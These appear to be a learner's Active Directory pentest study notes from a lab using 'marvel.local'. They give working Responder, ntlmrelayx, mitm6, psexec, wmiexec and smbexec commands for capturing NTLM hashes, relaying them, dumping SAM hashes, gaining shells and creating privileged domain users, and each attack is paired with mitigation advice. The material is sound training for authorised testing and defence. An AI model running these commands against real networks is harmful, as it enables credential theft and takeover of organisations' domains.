
Quick Information:
#### Initial Internal Attack Strategy ( To get started with the AD Pentest):

- Begin day with mitm6 or Responder (Prefer Responder for longer sessions, as mitm6 might cause outage)
- Run scans to generate traffic while running Responder (Scans like nessus, vulnerability scans, etc)
- If scans are taking too long, look for websites in scope (Using http_version in metasploit to sweep the network and subnets to see if we have any hosts alive)
- Look for default credentials on web logins
	- Printers
	- Jenkins
	- Etc
- Think outside the box

#### LLMNR (Link Local Multicast Name Resolution) Poisoning ( #LLMNR):

- Used to identify hosts when DNS fails to do so.
- Previously known as NBT-NS
- Key flaw is that the services utilize a user's username and NTLMv2 hash when appropriately responded to
- Overview of LLMNR attack:
	- The victim/target machine is asking the server to connect the victim to \\hackm, and also server doesn't have the idea of the path, responds back with no details
	- The victim/target then broadcasts/multicast to everyone asking to help with the connection of \\hackm.
	- Hacker can intercept this request and responds to victim requesting the hash to connect to \\hackm.
	- As victim machine provides the hash, hacker can try to hack the hash and use it for unethical use cases.
- Process for the LLMNR poisoning:
	- Step 1: Run Responder
		- syntax: `sudo responder -I eth0 -dwPv`
			- -I is interface, if its a VPN, it will be tun0 (Tunnel0)
				- if its a network, it will be eth0
			- -d this is for DHCP
			- -w this is for wpad (Start the WPAD rogue proxy server.)
			- -P this is for ProxyAuth (Froce NTLM authentication for the proxy)
			- v - Verbosity
			- Both w and P cannot be used at the same.
		- Syntax: `sudo responder --help` this can be used for more details about the responder.
	- Step 2: Wait for an event to occur, where the victim tries to connect to a shared path
	- Step 3: Responder picks the Hash from victim 
	- Step 4: Crack the hashes with hashcat #HASHCat if its weak.
	
#### LLMNR Poisoning Mitigation ( #LLMNR ):

- The best defense is to disable LLMNR and NBT-NS.
	- To disable LLMNR, select "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group Policy Editor. (This can be done in the AD DS server for a domain)
	- To disable NBT-NS, navigate to Network Connections > Network Adapter Properties > TCP/IPv4 Properties > Advanced tab > WINS tab and select "Disable NetBIOS over TCP/IP".
- If a company must use or cannot disable LLMNR/NBT-NS, the best course of action is to:
	- Require Network Access Control.
	- Require strong user passwords (e.g > 14 characters in length and limit common word usage.) The more complex and long the password, the harder it is for an attacker to crack the hash.

#### SMB Relay Attack ( #SMB ):

- What is SMB relay:
	- Instead of cracking hashes gathered with responder, we can instead relay those hashes to specific machines and potentially gain access.
	- Requirements:
		- SMB signing must be disabled or not enforced on the target
		- Relayed user credentials must be admin on machine for any real value
- To check the hosts without SMB Signing:
	- Syntax with nmap:
		- `nmap --script=smb2-security-mode.nse -p445 {ip-address} -Pn` 
		- `nmap --script=smb2-security-mode.nse -p445 10.0.0.0/24 -Pn`
			- -p445 is for port 445 for SMB
			- -Pn is used to force the probing, if not provided results may say that the hosts is down, using -Pn will force the  script to run, even though the ping option is not available
	- If the output contains with the text `Message signing enabled but not required` that means the machine doesn't have SMB signing
- Steps for SMB relay:
	- Step1: Update the responder conf in the path /etc/responder/Responder.conf with the below command.
		- `sudo mousepad /etc/responder/Responder.conf` and update the SMB and HTTP (Servers to start) to Off and save the file.
	- Step2: Run the responder with the below syntax:
		- `sudo responder -I eth0 -dPv`
	- Step3: Setup your relay with the tool `ntlmrelayx.py`
		- Syntax: `sudo ntlmrelayx.py -tf targets.txt -smb2support`
			- -tf - target file
		- targets.txt will contain the target details that is identified in the nmap scan for SMB signing is disabled.
	- Step4: An event occurs similar to LLMNR access a file share path from the target machine
	- Step5: ntlmrelayx will be dumping the SAM hashes of the users of the target machine.
	- Step6: (Optional) This is the step3 optional, where we add a -i to the end of the command, to enable a interactive shell on a port instead of dumping the SAM hashes
		- `sudo ntlmrelayx.py -tf targets.txt -smb2support -i`
		- Once the event occurs, we will observed that the relayx started a interactive SMB client shell via TCP on 127.0.0.1:11001
		- We can use netcat to listen to the port and access the shell
			- `nc 127.0.0.1 11001`
	- Step7: (Optional) This is the step3 optional, similar to Step6, we can add -c to run any command instead of the shell as well.
		- `sudo ntlmrelayx -tf targets.txt -smb2support -c "whoami"`

- Note: Make sure that the user from machine1 is added in the administration group of the machine2, in order for the SMB relay to work, as if the user is not part of the administrative group, relay attack is not possible
	- And also if the user from machine1 is already added, but for some case, is not showing up in the administrative group policy, start the domain controller and then check once, if not try to add the user again into the machine2.



#### SMB Relay Attack Mitigation ( #SMB )

- Enable SMB Signing on all devices
	- Pro: Completely stops the attack
	- Con: Can cause performance issues with file copies
- Disable NTLM authentication on network
	- Pro: Completely stops the attack
	- Con: If Kerberos stops working, Windows defaults back to NTLM
- Account tiering:
	- Pro: Limits domain admins to specific tasks (e.g only log onto servers with need for DA)
	- Con: Enforcing the policy may be difficult
- Local admin restriction:
	- Pro: Can prevent a lot of lateral movement
	- Con: Potential increase in the amount of service desk tickets


#### Gaining Shell Access (After SMB relay attack) ( #SMB , #Shell):

- We can get the shell access in the ntlmrelayx attack while exploiting the SMB relay, but we can also gain access to shell as below (Make sure that the windows defender is turned off in the target machine, or the attack will be blocked):
	1) Through Metasploit - with a password: `use exploit/windows/smb/psexec` and set the RHOSTS, SMBDomain, SMBPass and SMBUser
	2) Through Metasploit - with a hash: `use exploit/windows/smb/psexec` instead of password in the SMBPass. we will provide the hash (lmhash:nthash) , unset the domain (if set), set the SMBUser to 'administrator'/ local user, we are trying to login as.
	3) Through psexec tool - with a password: `psexec.py {domain}.local/{username}:'{Password}'@{ip-address}`
	4) Through psexec tool - with a hash: `psexec.py {username}@{ip-address} -hashes {LM:NT}`
	5) If psexec is blocked by antivirus, we can also try (both with password or hash):
		1) `wmiexec.py {domain}.local/{username}:'{Password}'@{ip-address}`
		2) `smbexec.py {domain}.local/{username}:'{Password}'@{ip-address}`


#### IPv6 DNS Takeover Attack via mitm6 (man in the middle6) ( #IPv6 #Important ):

- IPv6 DNS Takeover is the attack, were the attacker machine, will be acting as a DNS server for the IPv6 address, this can be done using the mitm6 tool:
	- Step1: Start a ntlmrelayx with the ldaps for the mitm6
		- `ntlmrelayx.py -6 -t ldaps://{ip-address(of the DC)} -wh fakewpad.marvel.local -l lootme`
			- -6 indicating we are using ipv6
			- -t (target)
			- -wh (this is for wpad)
			- -l (for loot, and the lootme is just a folder name)
	- Step2: Start the mitm6 with the below syntax:
		- `sudo mitm6 -d {domain-name}`
		- ex: `sudo mitm6 -d marvel.local`
	- Step3: Wait for an event, such as a system/machine reboot and mitm6 picks it immediately and the ntlmrelayx after the attack is succeeded, will create a lootme folder in the directory with all the domain_computers, domain_users, domain_groups and domain_user_by group details
	- Step4: If an administrator user logs into the machine, mitm6 will pick that as well and ntlmrelayx as all ways tries to attack and if its succeeds, it will create a random user in the domain controller with the enterprise group privileges, this can be checked in the domain controller (users)


#### IPv6 Attack mitigation ( #IPv6 ):

Mitigation Strategies:
- IPv6 poisoning abuses the fact that windows queries for an IPv6 address even in IPv4-only environments. If you do not use IPv6 internally, the safest way to prevent mitm6 is to block IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:
	- (Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)
	- (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
	- (Outbound) Core Networking - Dynamic Host Configuration Protocol for IPv6 (DHCPV6-Out)
- If WPAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc Service.
- Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
- Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.


#### Passback Attacks ( #Passback):

A **pass-back attack** is a type of cyber attack that involves an attacker leveraging a legitimate user's credentials to gain unauthorized access to a system or network. The attacker typically exploits a vulnerability in the authentication process, allowing them to effectively "pass back" authentication information, such as tokens or session identifiers, to impersonate the user. below is the example and process of exploiting a printer LDAP and SMTP protocols:

Link:  [https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack/)


